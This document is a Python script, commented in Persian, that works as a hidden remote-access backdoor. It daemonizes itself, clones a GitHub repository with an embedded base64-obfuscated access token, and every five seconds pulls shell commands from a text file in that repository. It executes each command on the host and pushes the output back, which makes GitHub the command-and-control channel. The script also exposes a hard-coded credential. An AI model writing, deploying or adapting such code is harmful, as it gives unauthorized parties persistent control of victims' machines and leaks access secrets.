#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import subprocess
import sys
import base64
import time
import hashlib
from datetime import datetime
from pathlib import Path

# ========== تنظیمات ==========
REPO_URL_BASE = "https://github.com/sazidehm/linuxsupd.git"
REPO_DIR = os.path.join(os.getcwd(), "linuxsupd")
BRANCH = "main"
GIT_USER = "claudetest"
GIT_EMAIL = "sazidehm@email.com"

TOKEN_B64 = "Z2hwX1R5SmJqNENEU2FSTGtQejlxU09ab3Z0eDljbURteDREQ3hMVw==2"
GITHUB_TOKEN = base64.b64decode(TOKEN_B64[:-1]).decode('utf-8')
REPO_URL = REPO_URL_BASE.replace("https://", f"https://{GITHUB_TOKEN}@")

CHECK_INTERVAL = 5  # تغییر از 10 به 5 ثانیه
# ==============================

def run_cmd(cmd, cwd=None):
    result = subprocess.run(cmd, shell=True, cwd=cwd, capture_output=True, text=True)
    return result.stdout.strip(), result.stderr.strip(), result.returncode

def git_init():
    repo_path = Path(REPO_DIR)
    if not repo_path.exists():
        run_cmd(f"git clone {REPO_URL} {REPO_DIR}")
    run_cmd(f"git config user.name '{GIT_USER}'", cwd=REPO_DIR)
    run_cmd(f"git config user.email '{GIT_EMAIL}'", cwd=REPO_DIR)
    run_cmd(f"git remote set-url origin {REPO_URL}", cwd=REPO_DIR)

def git_pull():
    run_cmd(f"git remote set-url origin {REPO_URL}", cwd=REPO_DIR)
    out, err, code = run_cmd(f"git pull origin {BRANCH}", cwd=REPO_DIR)
    if code != 0:
        run_cmd(f"git fetch origin {BRANCH}", cwd=REPO_DIR)
        run_cmd(f"git reset --hard origin/{BRANCH}", cwd=REPO_DIR)

def git_commit_push(message):
    run_cmd("git add .", cwd=REPO_DIR)
    out, err, code = run_cmd(f'git commit -m "{message}"', cwd=REPO_DIR)
    if code == 0 or "nothing to commit" in err or "nothing to commit" in out:
        run_cmd(f"git remote set-url origin {REPO_URL}", cwd=REPO_DIR)
        run_cmd(f"git push origin {BRANCH}", cwd=REPO_DIR)

def get_uptime():
    try:
        with open("/proc/uptime", "r") as f:
            uptime_seconds = float(f.read().split()[0])
        minutes = int(uptime_seconds // 60)
        hours = minutes // 60
        minutes = minutes % 60
        return f"{hours}h{minutes}m" if hours > 0 else f"{minutes}m"
    except:
        out, _, _ = run_cmd("uptime -p")
        return out.replace("up ", "").strip()

def update_online_txt():
    online_path = Path(REPO_DIR) / "online.txt"
    name = "test1"
    uptime = get_uptime()
    last_update = int(time.time())
    content = f"names={name}\nuptime={uptime}\nlast_update={last_update}\n"
    with open(online_path, "w") as f:
        f.write(content)

def process_commands():
    term_path = Path(REPO_DIR) / "terminalcomment.txt"
    if not term_path.exists():
        with open(term_path, "w") as f:
            f.write("com = \nansw = \n")
        return None

    with open(term_path, "r") as f:
        lines = f.readlines()

    com_line = next((line for line in lines if line.strip().startswith("com =")), None)
    if not com_line:
        return None

    com_value = com_line.split("=", 1)[1].strip()
    if not com_value:
        return None

    try:
        result = subprocess.check_output(com_value, shell=True, text=True, stderr=subprocess.STDOUT, timeout=30)
        answer = result.strip().replace("\n", " , ")
    except subprocess.CalledProcessError as e:
        answer = f"Error: {e.output.strip()}"
    except Exception as e:
        answer = f"Exception: {str(e)}"

    new_lines = []
    for line in lines:
        if line.strip().startswith("answ ="):
            new_lines.append(f"answ = {answer}\n")
        else:
            new_lines.append(line)

    if not any(line.strip().startswith("answ =") for line in new_lines):
        new_lines.append(f"answ = {answer}\n")

    with open(term_path, "w") as f:
        f.writelines(new_lines)

    return com_value

def daemonize():
    """تبدیل به دیمون با redirect کردن stdها به /dev/null"""
    if os.fork() > 0:
        sys.exit(0)
    os.setsid()
    if os.fork() > 0:
        sys.exit(0)
    os.chdir("/")
    with open('/dev/null', 'r+') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())

def main_loop():
    git_init()
    git_pull()
    update_online_txt()
    git_commit_push("Daemon started")

    last_hash = None
    while True:
        try:
            # ۱. دریافت آخرین تغییرات از مخزن
            git_pull()

            # ۲. به‌روزرسانی فایل online.txt (هر ۵ ثانیه)
            update_online_txt()

            # ۳. بررسی فایل terminalcomment.txt برای دستور جدید
            term_path = Path(REPO_DIR) / "terminalcomment.txt"
            if term_path.exists():
                with open(term_path, "r") as f:
                    content = f.read()
                current_hash = hashlib.md5(content.encode()).hexdigest()
                if current_hash != last_hash:
                    command = process_commands()
                    if command:
                        git_commit_push(f"Executed: {command}")
                    last_hash = current_hash
            else:
                with open(term_path, "w") as f:
                    f.write("com = \nansw = \n")
                last_hash = None

            # ۴. اگر تغییری در فایل‌ها رخ داده، آن‌ها را به مخزن ارسال کن
            # (این کار توسط git_commit_push انجام می‌شود که فقط در صورت وجود تغییر push می‌کند)

            # ۵. صبر کن به مدت CHECK_INTERVAL ثانیه
            time.sleep(CHECK_INTERVAL)

        except Exception:
            # هر گونه خطا را نادیده بگیر و به حلقه ادامه بده
            time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    # تبدیل به دیمون
    daemonize()
    main_loop()
